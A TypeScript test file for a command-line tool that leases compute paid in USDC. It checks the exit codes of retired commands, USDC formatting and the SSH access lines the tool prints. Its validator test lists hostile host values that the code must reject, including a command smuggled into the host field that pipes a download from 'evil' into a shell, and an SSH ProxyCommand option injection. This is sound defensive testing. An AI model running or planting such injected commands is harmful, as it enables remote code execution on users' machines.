import { test } from 'node:test';
import assert from 'node:assert/strict';
import { formatUsdc, MOVED, runCli, sshLine } from './cli.js';

async function cli(argv: string[]) {
  const out: string[] = [];
  const err: string[] = [];
  const code = await runCli(argv, {}, { out: (s) => out.push(s), err: (s) => err.push(s) });
  return { code, out: out.join('\n'), err: err.join('\n') };
}

test('offers, rent, renew and status say they move to the door and exit 2, paying nothing', async () => {
  for (const argv of [['offers'], ['rent', '--offer', 'x', '--urls', 'https://e.com', '--max-intervals', '1'], ['renew', '--lease', 'a'], ['status', 'a', 'b']]) {
    const r = await cli(argv);
    assert.equal(r.code, 2, argv.join(' '));
    assert.equal(r.err, MOVED);
    assert.equal(r.out, '');
  }
});

test('payer is gone: it and anything else print the usage and exit 2', async () => {
  for (const argv of [['payer'], [], ['nope']]) {
    const r = await cli(argv);
    assert.equal(r.code, 2);
    assert.match(r.err, /^usage:/);
  }
});

test('formatUsdc prints micro-USDC as a decimal', () => {
  assert.equal(formatUsdc(1_000_000n), '1');
  assert.equal(formatUsdc(5000n), '0.005');
});

test('public access prints ssh -p', () => {
  assert.equal(sshLine({ ssh: { host: '37.27.86.235', port: 22003, user: 'tenant' } }), 'ssh -p 22003 tenant@37.27.86.235');
});

test('onion access still prints the ProxyCommand line', () => {
  const host = `${'a'.repeat(56)}.anyone`;
  assert.equal(sshLine({ ssh: { host, port: 22, user: 'tenant' } }), `ssh -o ProxyCommand="nc -x 127.0.0.1:<your Anyone SOCKS port> %h %p" tenant@${host}`);
});

test('an invalid access prints no ssh line', () => {
  const ok = { host: '37.27.86.235', port: 22003, user: 'tenant' };
  for (const ssh of [
    { ...ok, host: 'x; curl evil|sh' },
    { ...ok, host: '-oProxyCommand=x' },
    { ...ok, host: 'foo.anyone' },
    { ...ok, port: 0 },
    { ...ok, port: 65536 },
    { ...ok, port: 22.5 },
    { ...ok, user: 'root' },
    { ...ok, host: `${'a'.repeat(56)}.anyone`, port: 2222 },
  ]) assert.equal(sshLine({ ssh }), undefined, JSON.stringify(ssh));
});
